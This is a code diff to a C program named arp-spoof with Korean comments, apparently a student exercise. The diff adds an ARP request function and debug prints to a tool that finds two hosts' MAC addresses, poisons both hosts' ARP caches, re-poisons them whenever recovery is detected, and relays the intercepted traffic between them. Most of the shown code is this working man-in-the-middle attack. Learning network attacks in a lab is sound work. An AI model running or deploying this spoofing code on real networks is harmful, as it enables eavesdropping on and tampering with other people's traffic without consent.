@@ -41,6 +41,36 @@ void usage()
 	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
 }
 
+void send_arp_request(pcap_t* handle, 
+                        uint8_t* src_mac, uint8_t* dst_mac, 
+                        uint8_t* sender_mac, uint32_t sender_ip, 
+                        uint8_t* target_mac, uint32_t target_ip)
+{
+    EtherArpPacket packet;
+
+    // Ethernet Header
+    memcpy(packet.ETHER.ether_dstMAC, dst_mac, 6);   
+    memcpy(packet.ETHER.ether_srcMAC, src_mac, 6);   
+    packet.ETHER.ether_next_type = htons(0x0806);
+
+    // ARP Payload
+    packet.ARP.Hardware_Type = htons(1);
+    packet.ARP.Protocol = htons(0x0800);
+    packet.ARP.Hardware_Length = 6;
+    packet.ARP.Protocol_Length = 4;
+    packet.ARP.Operation = htons(1);                
+
+    memcpy(packet.ARP.Sender_MAC, sender_mac, 6);      
+    packet.ARP.Sender_Protocol_Addr = htonl(sender_ip); 
+    memcpy(packet.ARP.Target_MAC, target_mac, 6);
+    packet.ARP.Target_Protocol_Addr = htonl(target_ip);
+
+    if (pcap_sendpacket(handle, (const unsigned char *)&packet, sizeof(packet)) != 0) 
+    {
+        fprintf(stderr, "[!] Error sending request packet: %s\n", pcap_geterr(handle));
+    }
+}                        
+
 // ARP 포이즈닝 패킷(reply)를 조립하고 보내는 함수. 인자 전달시 주의.
 void send_arp_poisoning(pcap_t* handle, 
                         uint8_t* src_mac, uint8_t* dst_mac, 
@@ -71,6 +101,8 @@ void send_arp_poisoning(pcap_t* handle,
         fprintf(stderr, "[!] Error sending poisoning packet: %s\n", pcap_geterr(handle));
     }
 }
+
+
 
 int main(int argc, char* argv[])
 {
@@ -149,12 +181,13 @@ int main(int argc, char* argv[])
          //우선 sender1의 맥 주소를 알아내기 위해 sender와 arp request&reply 주고받기
         //target1의 맥 주소를 알아내기 위해 arp request 보내는 코드 추가
         
-        //sender1 MAC 주소 얻기 위해 arp request 보내기(poisoning은 아니지만...)
-        send_arp_poisoning(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].sender_ip);
+        //sender1 MAC 주소 얻기 위해 arp request 보내기
+        send_arp_request(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].sender_ip);
+        printf("sent arp request packet to sender\n");
         
-        //target1 MAC 주소 얻기 위해 arp request 보내기(poisoning은 아니지만...)
-        send_arp_poisoning(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].target_ip);
-        
+        //target1 MAC 주소 얻기 위해 arp request 보내기
+        send_arp_request(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].target_ip);
+        printf("sent arp request packet to target\n");
 
         
         //여기서부터 arp reply
@@ -183,15 +216,18 @@ int main(int argc, char* argv[])
             if(memcmp(arpreply_packet->ETHER.ether_dstMAC,my_MAC,6) != 0) continue; //Ethernet 수준에서 내(공격자) MAC주소로 온게 맞으면
             if(ntohs(arpreply_packet->ETHER.ether_next_type) != 0x0806) continue; //ARP 패킷만 통과시키기
             if(ntohs(arpreply_packet->ARP.Operation) != 0x0002) continue; //ARP 수준에서 Reply가 맞아야하고
+            
             if(ntohl(arpreply_packet->ARP.Sender_Protocol_Addr) == pairs[i].sender_ip)
             {
                 if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue; //ARP 수준에서 arp payload에 담긴 target MAC주소가 내 MAC 주소가 맞다면 통과시키기
                 memcpy(sender_MAC,arpreply_packet->ARP.Sender_MAC,6);
+                printf("am i here? 1 \n");
                 break;
             } else if(ntohl(arpreply_packet->ARP.Sender_Protocol_Addr) == pairs[i].target_ip)
                 {
                     if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue;
                     memcpy(target_MAC, arpreply_packet->ARP.Sender_MAC,6);
+                    printf("am i here? 2 \n");
                     break;
                 }
             
@@ -203,9 +239,10 @@ int main(int argc, char* argv[])
 
         //sender1한테 한번 보내놓기
         send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+        printf("Sent first arp poisoning packet to sender \n");
         //target1한테 한번 보내놓기
         send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip); 
-
+        printf("Sent first arp poisoning packet to target \n");
         
         //여기서부터 arp poisoning 풀린걸 감지하면 re-infection해주는 부분 + relay 까지
         unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
@@ -240,6 +277,7 @@ int main(int argc, char* argv[])
                 arp_detect_packet->ARP.Operation == htons(0x01))
             {
                 send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                printf("Sent adaptive arp poisoning packet to sender : 1 \n");
                 continue;
             }
 
@@ -252,6 +290,7 @@ int main(int argc, char* argv[])
                 arp_detect_packet->ARP.Operation == htons(0x01))
             {
                 send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                printf("Sent adaptive arp poisoning packet to sender : 2 \n");
                 continue;
             }
 
@@ -264,6 +303,7 @@ int main(int argc, char* argv[])
                 ntohl(arp_detect_packet->ARP.Sender_Protocol_Addr) == pairs[i].target_ip)
             {
                 send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                printf("Sent adaptive arp poisoning packet to sender : 3,4,5 \n");
                 continue;
             }
            
@@ -282,6 +322,7 @@ int main(int argc, char* argv[])
                 ntohs(arp_detect_packet->ARP.Operation) == 0x01)
             {
                 send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                printf("Sent adaptive arp poisoning packet to target : 1 \n");
                 continue;
             }
 
@@ -294,6 +335,7 @@ int main(int argc, char* argv[])
                 ntohs(arp_detect_packet->ARP.Operation) == 0x01)
             {
                 send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                printf("Sent adaptive arp poisoning packet to target : 2 \n");
                 continue;
             }
 
@@ -306,6 +348,7 @@ int main(int argc, char* argv[])
                 ntohl(arp_detect_packet->ARP.Sender_Protocol_Addr) == pairs[i].sender_ip)
             {
                 send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                printf("Sent adaptive arp poisoning packet to target : 3,4,5 \n");
                 continue;
             }
 
@@ -327,7 +370,7 @@ int main(int argc, char* argv[])
                         memcmp(relay_packet->ETHER.ether_dstMAC, target_MAC, 6);
 
                         pcap_sendpacket(pcap, relay_buf, header->caplen);
-                        
+                        printf("Sent relay packet: sender -> me -> target");
                     }
                 
                     
@@ -343,6 +386,7 @@ int main(int argc, char* argv[])
                         memcmp(relay_packet->ETHER.ether_dstMAC, sender_MAC, 6);
 
                         pcap_sendpacket(pcap, relay_buf, header->caplen);
+                        printf("Sent relay packet: target -> me -> sender");
                         
                     }
             }
